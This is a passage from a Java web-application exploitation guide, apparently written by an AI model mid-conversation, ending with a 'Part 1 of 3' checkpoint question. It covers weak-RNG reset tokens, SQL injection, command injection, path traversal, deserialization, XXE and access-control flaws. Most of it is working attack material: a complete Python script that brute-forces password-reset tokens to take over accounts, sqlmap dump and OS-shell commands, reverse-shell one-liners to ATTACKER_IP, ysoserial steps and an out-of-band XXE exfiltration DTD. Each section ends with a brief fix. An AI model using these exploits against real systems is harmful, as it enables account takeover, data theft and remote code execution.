grep -rn "new Random(System.currentTimeMillis" .

# Look in these files:
*Util*.java
*Helper*.java
*Generator*.java
*Token*.java
*Session*.java
*Random*.java
```

---

### **Locations to Check**

```
Common vulnerable locations:
1. Password reset token generation
2. Session ID generation
3. CSRF token generation
4. Remember-me token generation
5. API key generation
6. Temporary password generation
7. Verification code generation
```

---

### **Exploitation Steps**

```
Step 1: Identify the vulnerable function
        └─ Find where Random(System.currentTimeMillis()) is used

Step 2: Understand the token format
        └─ How long is it? (e.g., 40 characters)
        └─ What charset? (e.g., base62: 0-9A-Za-z)

Step 3: Trigger token generation
        └─ Send password reset request
        └─ Note the exact time (milliseconds)

Step 4: Calculate time window
        └─ Request start time
        └─ Request end time
        └─ Window = end - start (typically 100-500ms)

Step 5: Generate all possible tokens
        └─ Write Java program using SAME code
        └─ Generate token for each millisecond in window

Step 6: Brute-force
        └─ Try each token
        └─ One will work!
```

---

### **Exploit Code Template**

```java
// TokenGenerator.java
import java.util.Random;

public class TokenGenerator {
    
    // COPY THE EXACT CODE FROM TARGET APPLICATION
    public static String generateToken(long seed) {
        Random random = new Random(seed);
        StringBuilder token = new StringBuilder();
        String charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        
        for (int i = 0; i < 40; i++) {
            token.append(charset.charAt(random.nextInt(charset.length())));
        }
        
        return token.toString();
    }
    
    public static void main(String[] args) {
        if (args.length < 2) {
            System.out.println("Usage: java TokenGenerator <start_ms> <end_ms>");
            return;
        }
        
        long start = Long.parseLong(args[0]);
        long end = Long.parseLong(args[1]);
        
        for (long seed = start; seed <= end; seed++) {
            System.out.println(generateToken(seed));
        }
    }
}
```

```bash
# Compile
javac TokenGenerator.java

# Generate tokens for time window
java TokenGenerator 1734567890123 1734567890456 > tokens.txt

# Result: 333 tokens generated
```

---

```python
#!/usr/bin/env python3
# exploit.py

import requests
import subprocess
import argparse
from datetime import datetime

class WeakRNGExploit:
    
    def __init__(self, target, username):
        self.target = target
        self.username = username
        self.base_url = f"http://{target}/app"
    
    def get_current_time_ms(self):
        """Get current time in milliseconds"""
        return int(datetime.now().timestamp() * 1000)
    
    def trigger_reset(self):
        """Trigger password reset and capture time window"""
        print(f"[*] Triggering password reset for: {self.username}")
        
        start_time = self.get_current_time_ms()
        
        response = requests.post(
            f"{self.base_url}/resetPassword",
            data={'username': self.username}
        )
        
        end_time = self.get_current_time_ms()
        
        print(f"[+] Time window: {start_time} - {end_time}")
        print(f"[+] Window size: {end_time - start_time}ms")
        
        return start_time, end_time
    
    def generate_tokens(self, start, end):
        """Generate tokens using Java program"""
        print(f"[*] Generating tokens...")
        
        cmd = ['java', 'TokenGenerator', str(start), str(end)]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        tokens = result.stdout.strip().split('\n')
        print(f"[+] Generated {len(tokens)} tokens")
        
        return tokens
    
    def test_token(self, token, new_password):
        """Test if token works"""
        response = requests.post(
            f"{self.base_url}/confirmReset",
            data={
                'token': token,
                'username': self.username,
                'password': new_password,
                'confirm': new_password
            }
        )
        
        return "success" in response.text.lower() or \
               "reset" in response.text.lower() and "error" not in response.text.lower()
    
    def exploit(self, new_password):
        """Main exploit function"""
        print(f"\n[*] Starting Weak RNG Exploit")
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Username: {self.username}\n")
        
        # Step 1: Trigger reset
        start, end = self.trigger_reset()
        
        # Add buffer
        start -= 500
        end += 500
        
        # Step 2: Generate tokens
        tokens = self.generate_tokens(start, end)
        
        # Step 3: Test each token
        print(f"\n[*] Testing tokens...")
        for i, token in enumerate(tokens, 1):
            if self.test_token(token, new_password):
                print(f"\n[+] SUCCESS!")
                print(f"[+] Valid token found: {token}")
                print(f"[+] Position: {i}/{len(tokens)}")
                print(f"[+] Seed: {start + i - 1}")
                print(f"[+] Password changed to: {new_password}")
                return True
            
            if i % 50 == 0:
                print(f"[*] Tried {i}/{len(tokens)} tokens...")
        
        print(f"\n[-] Failed to find valid token")
        return False

def main():
    parser = argparse.ArgumentParser(description='Weak RNG Exploit')
    parser.add_argument('-t', '--target', required=True, help='Target IP/hostname')
    parser.add_argument('-u', '--username', required=True, help='Target username')
    parser.add_argument('-p', '--password', required=True, help='New password')
    
    args = parser.parse_args()
    
    exploit = WeakRNGExploit(args.target, args.username)
    exploit.exploit(args.password)

if __name__ == '__main__':
    main()
```

---

### **Fix (For Reference)**

```java
// SECURE CODE
import java.security.SecureRandom;

public class SecureTokenGenerator {
    public String generateResetToken() {
        SecureRandom random = new SecureRandom();  // ✓ Cryptographically secure
        
        byte[] bytes = new byte[30];
        random.nextBytes(bytes);
        
        // Convert to Base64 or Hex
        return Base64.getEncoder().encodeToString(bytes);
    }
}
```

---

## Vulnerability #2: SQL Injection

### **Pattern 1: String Concatenation**

```java
// VULNERABLE
public User login(String username, String password) {
    String query = "SELECT * FROM users WHERE username='" + username + 
                   "' AND password='" + password + "'";
    
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    
    if (rs.next()) {
        return new User(rs);
    }
    return null;
}
```

**Exploit:**
```
username: admin' OR '1'='1'--
password: anything

Resulting query:
SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='anything'
                                            ↑ Always true!
```

---

### **Pattern 2: String.format()**

```java
// VULNERABLE
String query = String.format(
    "SELECT * FROM products WHERE id=%s",
    productId
);
stmt.executeQuery(query);
```

**Exploit:**
```
productId: 1 UNION SELECT username,password FROM users--

Resulting query:
SELECT * FROM products WHERE id=1 UNION SELECT username,password FROM users--
```

---

### **Pattern 3: Dynamic Queries**

```java
// VULNERABLE
public List<User> searchUsers(String searchTerm, String sortColumn) {
    String query = "SELECT * FROM users WHERE name LIKE '%" + searchTerm + 
                   "%' ORDER BY " + sortColumn;
    // ...
}
```

**Exploit:**
```
sortColumn: (CASE WHEN (SELECT password FROM users WHERE username='admin') 
            LIKE 'a%' THEN id ELSE name END)

// Blind SQL injection via ORDER BY
```

---

### **How to Find**

```bash
# JD-GUI search:
Ctrl+Shift+F → "executeQuery"
Look for: + operator near executeQuery

Ctrl+Shift+F → "Statement.create"
Look for: createStatement() without PreparedStatement

Ctrl+Shift+F → "+ request.getParameter"
Direct hit!

# Grep:
grep -rn "executeQuery.*+" .
grep -rn "Statement.*createStatement" .
grep -rn 'SELECT.*FROM.*WHERE.*".*+' .
```

---

### **Locations to Check**

```
*DAO.java           - Data Access Objects
*Repository.java    - Repository pattern
*Service.java       - Business logic with DB access
*Helper.java        - Database helper functions
*Util.java          - Utility functions
LoginServlet.java   - Authentication
SearchServlet.java  - Search functionality
```

---

### **Exploitation - Manual**

```
Step 1: Identify injection point
    └─ Find parameter that goes into query

Step 2: Confirm vulnerability
    Payload: '
    Result: SQL error? → Injectable!

Step 3: Determine database type
    Payload: ' AND 1=1--    (MySQL/MSSQL)
    Payload: ' AND 1=1#     (MySQL)
    Payload: ' AND 1=1;--   (PostgreSQL)

Step 4: Extract data
    Union-based:
    ' UNION SELECT username, password FROM users--
    
    Boolean-based:
    ' AND (SELECT LENGTH(password) FROM users WHERE id=1)>5--
    
    Time-based:
    '; WAITFOR DELAY '00:00:05'--   (MSSQL)
    ' AND SLEEP(5)--                (MySQL)
    ' AND pg_sleep(5)--             (PostgreSQL)

Step 5: Dump database
    ' UNION SELECT table_name FROM information_schema.tables--
    ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

---

### **Exploitation - SQLMap**

```bash
# Test GET parameter
sqlmap -u "http://target/product?id=1" --batch

# Test POST data
sqlmap -u "http://target/login" \
    --data="username=test&password=test" \
    --batch

# Dump database
sqlmap -u "http://target/product?id=1" \
    --dbs \
    --batch

# Dump specific database
sqlmap -u "http://target/product?id=1" \
    -D webapp \
    --tables \
    --batch

# Dump table
sqlmap -u "http://target/product?id=1" \
    -D webapp \
    -T users \
    --dump \
    --batch

# Get shell
sqlmap -u "http://target/product?id=1" \
    --os-shell \
    --batch
```

---

### **Fix (For Reference)**

```java
// SECURE
public User login(String username, String password) {
    String query = "SELECT * FROM users WHERE username=? AND password=?";
    
    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, username);
    pstmt.setString(2, password);
    
    ResultSet rs = pstmt.executeQuery();
    
    if (rs.next()) {
        return new User(rs);
    }
    return null;
}
```

---

## Vulnerability #3: Command Injection

### **The Vulnerability**

```java
// VULNERABLE
public String pingHost(String host) {
    try {
        String command = "ping -c 4 " + host;
        Process process = Runtime.getRuntime().exec(command);
        
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );
        
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        
        return output.toString();
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}
```

**Exploit:**
```
host: 8.8.8.8; cat /etc/passwd

Command executed:
ping -c 4 8.8.8.8; cat /etc/passwd
                  ↑ Second command executed!
```

---

### **Pattern 2: ProcessBuilder**

```java
// VULNERABLE
String userCommand = request.getParameter("cmd");
ProcessBuilder pb = new ProcessBuilder("sh", "-c", userCommand);
Process process = pb.start();
```

**Exploit:**
```
cmd: id; cat /etc/passwd; whoami

All commands executed!
```

---

### **How to Find**

```bash
# JD-GUI:
Ctrl+Shift+F → "Runtime.getRuntime"
Ctrl+Shift+F → "ProcessBuilder"
Ctrl+Shift+F → ".exec("

# Grep:
grep -rn "Runtime.getRuntime().exec" .
grep -rn "ProcessBuilder" .
grep -rn "Process.*start" .
```

---

### **Exploitation**

```
Basic test:
; ls -la
| whoami
& id
`cat /etc/passwd`

Read files:
; cat /etc/passwd
| cat /flag.txt

Reverse shell:
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; nc ATTACKER_IP 4444 -e /bin/bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

### **Fix (For Reference)**

```java
// SECURE
public String pingHost(String host) {
    // Validate input
    if (!host.matches("^[a-zA-Z0-9.-]+$")) {
        return "Invalid hostname";
    }
    
    // Use array form (doesn't invoke shell)
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
    // Process will be: ["ping", "-c", "4", "validated_host"]
    // No shell interpretation!
    
    Process process = pb.start();
    // ...
}
```

---

## Vulnerability #4: Path Traversal

### **The Vulnerability**

```java
// VULNERABLE
@WebServlet("/download")
public class DownloadServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, 
                        HttpServletResponse response) {
        String filename = request.getParameter("file");
        String filePath = "/var/www/uploads/" + filename;
        
        File file = new File(filePath);
        
        FileInputStream fis = new FileInputStream(file);
        // Send file to user...
    }
}
```

**Exploit:**
```
file: ../../../etc/passwd

Resulting path:
/var/www/uploads/../../../etc/passwd
= /etc/passwd
```

---

### **Pattern 2: With Validation Bypass**

```java
// VULNERABLE (weak validation)
String filename = request.getParameter("file");

// Attempt to prevent traversal
if (filename.contains("..")) {
    return "Invalid filename";
}

// But this can be bypassed!
File file = new File("/uploads/" + filename);
```

**Exploit:**
```
file: ....//....//etc/passwd
After removing "..": ..//..//etc/passwd ← Still works!

file: ..%2F..%2Fetc%2Fpasswd
URL decoded: ../../etc/passwd

file: uploads/../../../etc/passwd
Starts with uploads but still traverses!
```

---

### **How to Find**

```bash
# JD-GUI:
Ctrl+Shift+F → "new File("
Look for: + request.getParameter

Ctrl+Shift+F → "FileInputStream"
Ctrl+Shift+F → "FileReader"

# Grep:
grep -rn "new File.*request.getParameter" .
grep -rn "FileInputStream.*getParameter" .
```

---

### **Exploitation**

```
Linux targets:
/etc/passwd
/etc/shadow
/root/.ssh/id_rsa
/home/user/.bash_history
/var/log/apache2/access.log
/var/www/html/config.php
/proc/self/environ

Windows targets:
C:\Windows\System32\config\SAM
C:\Windows\System32\drivers\etc\hosts
C:\Users\Administrator\Desktop\proof.txt
C:\inetpub\wwwroot\web.config

Bypass techniques:
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252Fetc%252Fpasswd (double encoding)
..%c0%af..%c0%af (Unicode)
```

---

### **Fix (For Reference)**

```java
// SECURE
public File getFile(String filename) {
    // 1. Whitelist allowed files
    List<String> allowed = Arrays.asList("doc1.pdf", "doc2.pdf");
    if (!allowed.contains(filename)) {
        throw new SecurityException("File not allowed");
    }
    
    // 2. OR use canonical path check
    File file = new File("/uploads/" + filename);
    String canonicalPath = file.getCanonicalPath();
    
    if (!canonicalPath.startsWith("/uploads/")) {
        throw new SecurityException("Path traversal detected");
    }
    
    return file;
}
```

---

## Vulnerability #5: Insecure Deserialization

### **The Vulnerability**

```java
// VULNERABLE
@WebServlet("/api/update")
public class UpdateServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, 
                         HttpServletResponse response) {
        try {
            String data = request.getParameter("data");
            byte[] bytes = Base64.getDecoder().decode(data);
            
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(bytes)
            );
            
            Object obj = ois.readObject();  // ← DANGER!
            
            // Process object...
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

---

### **Why It's Dangerous**

When Java deserializes an object, it calls special methods:
- `readObject()` - called during deserialization
- `writeObject()` - called during serialization

Attackers can craft malicious objects that execute code in these methods!

---

### **How to Find**

```bash
# JD-GUI:
Ctrl+Shift+F → "ObjectInputStream"
Ctrl+Shift+F → "readObject()"
Ctrl+Shift+F → "Serializable"

# Grep:
grep -rn "ObjectInputStream" .
grep -rn "readObject" .
grep -rn "implements Serializable" .
```

---

### **Exploitation with ysoserial**

```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# List available payloads
java -jar ysoserial-all.jar

# Output:
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
Spring1
Spring2
...

# Generate payload (example: execute 'id')
java -jar ysoserial-all.jar CommonsCollections1 'id' > payload.bin

# Base64 encode
base64 -w0 payload.bin > payload.b64

# Send to application
curl -X POST http://target/api/update \
    --data "data=$(cat payload.b64)"

# Check if command executed (look for response or out-of-band)

# Reverse shell payload
java -jar ysoserial-all.jar CommonsCollections1 \
    'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -w0
```

---

### **Which Payload to Use?**

```
Check application's libraries:

If commons-collections-3.1.jar present:
    └─ Use CommonsCollections1-7

If Spring Framework:
    └─ Use Spring1 or Spring2

If Apache Commons FileUpload:
    └─ Use FileUpload1

Try different payloads until one works!
```

---

### **Manual Payload Creation (Advanced)**

```java
// Create malicious serializable object
import java.io.*;

public class EvilObject implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        // This code executes during deserialization!
        Runtime.getRuntime().exec("calc.exe");
    }
}

// Serialize it
ObjectOutputStream oos = new ObjectOutputStream(
    new FileOutputStream("evil.ser")
);
oos.writeObject(new EvilObject());
oos.close();

// Base64 encode and send to target
```

---

### **Fix (For Reference)**

```java
// SECURE - Don't deserialize untrusted data!

// Option 1: Use JSON instead
ObjectMapper mapper = new ObjectMapper();
MyObject obj = mapper.readValue(jsonString, MyObject.class);

// Option 2: If must deserialize, use ValidatingObjectInputStream
class ValidatingObjectInputStream extends ObjectInputStream {
    private static final List<String> ALLOWED_CLASSES = Arrays.asList(
        "com.company.app.User",
        "com.company.app.Product"
    );
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized class: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

---

## Vulnerability #6: XXE (XML External Entity)

### **The Vulnerability**

```java
// VULNERABLE
@WebServlet("/api/process")
public class XMLProcessorServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, 
                         HttpServletResponse response) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            
            // Parse user-supplied XML
            Document doc = builder.parse(request.getInputStream());
            
            // Process document...
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

---

### **Exploitation**

```xml
<!-- Basic XXE - File Read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <username>&xxe;</username>
</data>

<!-- Server will read /etc/passwd and include in response! -->
```

---

```xml
<!-- XXE - SSRF (Internal Port Scan) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<data>&xxe;</data>

<!-- Test different ports:
http://localhost:22    (SSH)
http://localhost:3306  (MySQL)
http://localhost:5432  (PostgreSQL)
-->
```

---

```xml
<!-- XXE - Out-of-Band (Blind) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">
  %dtd;
  %send;
]>
<data>test</data>

<!-- evil.dtd on attacker server:
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%payload;
-->
```

---

### **How to Find**

```bash
# JD-GUI:
Ctrl+Shift+F → "DocumentBuilderFactory"
Ctrl+Shift+F → "SAXParserFactory"
Ctrl+Shift+F → "XMLReader"
Ctrl+Shift+F → "parse("

# Grep:
grep -rn "DocumentBuilderFactory" .
grep -rn "SAXParser" .
grep -rn "XMLReader" .
```

---

### **Fix (For Reference)**

```java
// SECURE
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable external entities
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputStream);
```

---

## Vulnerability #7: Authentication/Authorization Flaws

### **Pattern 1: Missing Authentication Check**

```java
// VULNERABLE
@WebServlet("/admin/deleteUser")
public class DeleteUserServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, 
                         HttpServletResponse response) {
        String userId = request.getParameter("id");
        
        // NO AUTHENTICATION CHECK!
        userDAO.deleteUser(userId);
        
        response.getWriter().write("User deleted");
    }
}
```

**Exploit:**
```
POST /admin/deleteUser HTTP/1.1
Host: target.com

id=1

← Admin user deleted without authentication!
```

---

### **Pattern 2: Weak Session Validation**

```java
// VULNERABLE
public boolean isAuthenticated(HttpServletRequest request) {
    String sessionId = request.getParameter("sessionId");
    
    if (sessionId != null && sessionId.length() > 0) {
        return true;  // ← Any non-empty session ID passes!
    }
    
    return false;
}
```

---

### **Pattern 3: IDOR (Insecure Direct Object Reference)**

```java
// VULNERABLE
@WebServlet("/api/profile")
public class ProfileServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, 
                        HttpServletResponse response) {
        int userId = Integer.parseInt(request.getParameter("id"));
        
        // NO CHECK if logged-in user can access this profile!
        User user = userDAO.getUser(userId);
        
        response.getWriter().write(user.toJSON());
    }
}
```

**Exploit:**
```
GET /api/profile?id=1   ← View admin profile
GET /api/profile?id=2   ← View another user
GET /api/profile?id=999 ← View any user
```

---

### **Pattern 4: Role Manipulation**

```java
// VULNERABLE
@WebServlet("/api/updateUser")
public class UpdateUserServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, 
                         HttpServletResponse response) {
        int userId = Integer.parseInt(request.getParameter("userId"));
        String username = request.getParameter("username");
        String role = request.getParameter("role");  // ← From user input!
        
        User user = new User();
        user.setId(userId);
        user.setUsername(username);
        user.setRole(role);  // ← User can set their own role!
        
        userDAO.update(user);
    }
}
```

**Exploit:**
```
POST /api/updateUser HTTP/1.1

userId=5&username=hacker&role=ADMIN

← Normal user becomes admin!
```

---

### **How to Find**

```bash
# JD-GUI search for missing auth:
Ctrl+Shift+F → "@WebServlet"
Then check each servlet for authentication logic

Ctrl+Shift+F → "session"
Look for session validation

Ctrl+Shift+F → "isAdmin"
Ctrl+Shift+F → "hasRole"
Ctrl+Shift+F → "checkPermission"

# Grep:
grep -rn "@WebServlet\|@RequestMapping" .
grep -rn "getParameter.*id" .
```

---

### **Exploitation Checklist**

```
Test for missing authentication:
□ Try accessing /admin/* without login
□ Try /api/* endpoints without auth
□ Remove session cookies and retry

Test for IDOR:
□ Change id=1 to id=2
□ Change userId=5 to userId=1 (admin?)
□ Try negative IDs: id=-1
□ Try large IDs: id=999999

Test for horizontal privilege escalation:
□ User A access User B's resources
□ /profile?user=alice → user=bob

Test for vertical privilege escalation:
□ Normal user → Admin panel
□ role=user → role=admin
□ isAdmin=false → isAdmin=true

Test for mass assignment:
□ Add extra parameters: &role=admin
□ Modify hidden fields in forms
```

---

### **Fix (For Reference)**

```java
// SECURE
@WebServlet("/api/profile")
public class SecureProfileServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, 
                        HttpServletResponse response) {
        // 1. Verify user is authenticated
        HttpSession session = request.getSession(false);
        if (session == null || session.getAttribute("userId") == null) {
            response.sendError(401, "Unauthorized");
            return;
        }
        
        int loggedInUserId = (int) session.getAttribute("userId");
        int requestedUserId = Integer.parseInt(request.getParameter("id"));
        
        // 2. Verify user can access this profile
        if (loggedInUserId != requestedUserId && !isAdmin(loggedInUserId)) {
            response.sendError(403, "Forbidden");
            return;
        }
        
        // 3. Now it's safe
        User user = userDAO.getUser(requestedUserId);
        response.getWriter().write(user.toJSON());
    }
}
```

---

# Continuing with more vulnerabilities, frameworks, and complete exploitation scenarios...

**CHECKPOINT: Part 1 of 3 Complete**

This document is getting quite long. Should I:
1. Continue with the remaining parts (Spring, .NET, PHP, Python, etc.)?
2. Save this as-is and create additional specialized documents?
3. Focus on specific technologies you'll encounter most?

Bu ilk hissə hazırdır. Davam edimmi tam dokument üçün? Və ya fərqli fayllar yaradımmmı hər texnologiya üçün?
